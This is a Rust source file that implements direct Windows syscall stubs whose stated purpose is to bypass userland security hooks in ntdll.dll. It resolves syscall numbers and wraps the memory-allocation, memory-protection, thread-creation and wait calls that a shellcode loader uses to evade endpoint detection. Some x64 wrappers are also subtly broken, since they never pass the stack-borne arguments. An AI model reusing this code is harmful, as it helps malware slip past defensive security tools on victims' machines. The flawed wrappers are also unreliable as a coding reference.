//syscall.rs
//Direct syscall stubs — bypass userland hooks in ntdll.dll
//Author: wanmywann

use std::sync::atomic::{AtomicU32, Ordering};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::HANDLE,
        System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
    },
};

static SSN_ALLOCATE: AtomicU32 = AtomicU32::new(0);
static SSN_PROTECT: AtomicU32 = AtomicU32::new(0);
static SSN_CREATE_THREAD: AtomicU32 = AtomicU32::new(0);
static SSN_WAIT: AtomicU32 = AtomicU32::new(0);

unsafe fn resolve_ssn(module: &str, func: &str) -> u32 {
    let module_ansi: Vec<u8> = module.bytes().chain(std::iter::once(0)).collect();
    let func_ansi: Vec<u8> = func.bytes().chain(std::iter::once(0)).collect();

    let h_mod = match GetModuleHandleA(PCSTR(module_ansi.as_ptr())) {
        Ok(h) => h,
        Err(_) => {
            let _ = LoadLibraryA(PCSTR(module_ansi.as_ptr()));
            GetModuleHandleA(PCSTR(module_ansi.as_ptr())).unwrap_or(windows::Win32::Foundation::HMODULE::default())
        }
    };

    let addr = GetProcAddress(h_mod, PCSTR(func_ansi.as_ptr()))
        .expect(&format!("Failed to resolve {}", func))
        as *const u8;

    for i in 0..32 {
        if *addr.add(i) == 0xB8 {
            let ssn_ptr = addr.add(i + 1) as *const u32;
            return std::ptr::read_unaligned(ssn_ptr);
        }
    }

    panic!("Failed to resolve SSN for {}", func);
}

#[cfg(target_arch = "x86_64")]
pub fn init_syscalls() {
    unsafe {
        SSN_ALLOCATE.store(resolve_ssn("ntdll.dll", "NtAllocateVirtualMemory"), Ordering::Release);
        SSN_PROTECT.store(resolve_ssn("ntdll.dll", "NtProtectVirtualMemory"), Ordering::Release);
        SSN_CREATE_THREAD.store(resolve_ssn("ntdll.dll", "NtCreateThreadEx"), Ordering::Release);
        SSN_WAIT.store(resolve_ssn("ntdll.dll", "NtWaitForSingleObject"), Ordering::Release);
    }
}

#[cfg(target_arch = "x86")]
pub fn init_syscalls() {
    unsafe {
        SSN_ALLOCATE.store(resolve_ssn("ntdll.dll", "NtAllocateVirtualMemory"), Ordering::Release);
        SSN_PROTECT.store(resolve_ssn("ntdll.dll", "NtProtectVirtualMemory"), Ordering::Release);
        SSN_CREATE_THREAD.store(resolve_ssn("ntdll.dll", "NtCreateThreadEx"), Ordering::Release);
        SSN_WAIT.store(resolve_ssn("ntdll.dll", "NtWaitForSingleObject"), Ordering::Release);
    }
}

// --- x64 wrappers -----------------------------------------------------------

#[cfg(target_arch = "x86_64")]
#[inline(never)]
#[allow(unused_variables)]
pub unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut *mut ::core::ffi::c_void,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> i32 {
    let ssn = SSN_ALLOCATE.load(Ordering::Acquire);
    let ret: i32;
    std::arch::asm!(
        "mov r10, {h}",
        "mov rdx, {b}",
        "mov r8,  {z}",
        "mov r9,  {s}",
        "mov eax, {ssn:e}",
        "syscall",
        h   = in(reg) process_handle.0,
        b   = in(reg) base_address,
        z   = in(reg) zero_bits,
        s   = in(reg) region_size,
        ssn = in(reg) ssn,
        lateout("eax") ret,
        out("r11") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(never)]
#[allow(unused_variables)]
pub unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut *mut ::core::ffi::c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    let ssn = SSN_PROTECT.load(Ordering::Acquire);
    let ret: i32;
    std::arch::asm!(
        "mov r10, {h}",
        "mov rdx, {b}",
        "mov r8,  {rs}",
        "mov r9,  {np}",
        "mov eax, {ssn:e}",
        "syscall",
        h   = in(reg) process_handle.0,
        b   = in(reg) base_address,
        rs  = in(reg) region_size,
        np  = in(reg) new_protect as usize,
        ssn = in(reg) ssn,
        lateout("eax") ret,
        out("r11") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(never)]
#[allow(unused_variables)]
pub unsafe fn nt_create_thread_ex(
    thread_handle: *mut HANDLE,
    desired_access: u32,
    object_attributes: *mut ::core::ffi::c_void,
    process_handle: HANDLE,
    start_address: *mut ::core::ffi::c_void,
    parameter: *mut ::core::ffi::c_void,
    create_flags: u32,
    zero_bits: usize,
    stack_commit: usize,
    stack_reserve: usize,
    bytes_buffer: *mut ::core::ffi::c_void,
) -> i32 {
    let ssn = SSN_CREATE_THREAD.load(Ordering::Acquire);
    let ret: i32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        in("rcx") thread_handle,
        in("rdx") desired_access as usize,
        in("r8")  object_attributes,
        in("r9")  process_handle.0,
        ssn = in(reg) ssn,
        lateout("eax") ret,
        out("r11") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(never)]
pub unsafe fn nt_wait_for_single_object(
    handle: HANDLE,
    alertable: bool,
    timeout: *mut i64,
) -> i32 {
    let ssn = SSN_WAIT.load(Ordering::Acquire);
    let ret: i32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        in("rcx") handle.0,
        in("rdx") alertable as u8 as usize,
        in("r8")  timeout,
        ssn = in(reg) ssn,
        lateout("eax") ret,
        out("r11") _,
        options(nostack),
    );
    ret
}

// --- x86 wrappers (fallback to Windows APIs) ---------------------------------

#[cfg(target_arch = "x86")]
use windows::Win32::{
    System::{
        Memory::{
            VirtualAlloc, VirtualProtect,
            PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
        },
        Threading::{CreateThread, WaitForSingleObject, INFINITE, CREATE_THREAD_FLAGS},
    },
};

#[cfg(target_arch = "x86")]
unsafe fn map_page_protect(prot: u32) -> PAGE_PROTECTION_FLAGS {
    // All standard PAGE_* constants fit in u8; pass through to newtype
    PAGE_PROTECTION_FLAGS(prot)
}

#[cfg(target_arch = "x86")]
#[inline(never)]
pub unsafe fn nt_allocate_virtual_memory(
    _process_handle: HANDLE,
    base_address: *mut *mut ::core::ffi::c_void,
    _zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> i32 {
    let va_type = VIRTUAL_ALLOCATION_TYPE(allocation_type);
    let va_protect = map_page_protect(protect);
    let result = VirtualAlloc(
        Some(*base_address as *const _),
        *region_size,
        va_type,
        va_protect,
    );
    if result.is_null() { *base_address = std::ptr::null_mut(); -1 } else { 0 }
}

#[cfg(target_arch = "x86")]
#[inline(never)]
pub unsafe fn nt_protect_virtual_memory(
    _process_handle: HANDLE,
    base_address: *mut *mut ::core::ffi::c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    let mut old = PAGE_PROTECTION_FLAGS(0);
    let ok = VirtualProtect(
        *base_address as *const _,
        *region_size,
        map_page_protect(new_protect),
        &mut old,
    );
    *old_protect = old.0;
    if let Ok(_) = ok { 0 } else { -1 }
}

#[cfg(target_arch = "x86")]
#[inline(never)]
pub unsafe fn nt_create_thread_ex(
    thread_handle: *mut HANDLE,
    _desired_access: u32,
    _object_attributes: *mut ::core::ffi::c_void,
    _process_handle: HANDLE,
    start_address: *mut ::core::ffi::c_void,
    parameter: *mut ::core::ffi::c_void,
    create_flags: u32,
    _zero_bits: usize,
    _stack_commit: usize,
    _stack_reserve: usize,
    _bytes_buffer: *mut ::core::ffi::c_void,
) -> i32 {
    let h = CreateThread(
        None,
        0,
        Some(std::mem::transmute(start_address)),
        parameter,
        CREATE_THREAD_FLAGS(create_flags),
        None,
    );
    match h {
        Ok(h) => { *thread_handle = h; 0 }
        Err(_) => -1,
    }
}

#[cfg(target_arch = "x86")]
#[inline(never)]
pub unsafe fn nt_wait_for_single_object(
    handle: HANDLE,
    _alertable: bool,
    timeout: *mut i64,
) -> i32 {
    let ms = if timeout.is_null() {
        INFINITE
    } else {
        (*timeout as u32).wrapping_div(10000) // 100ns → ms
    };
    let _ = WaitForSingleObject(handle, ms);
    0
}
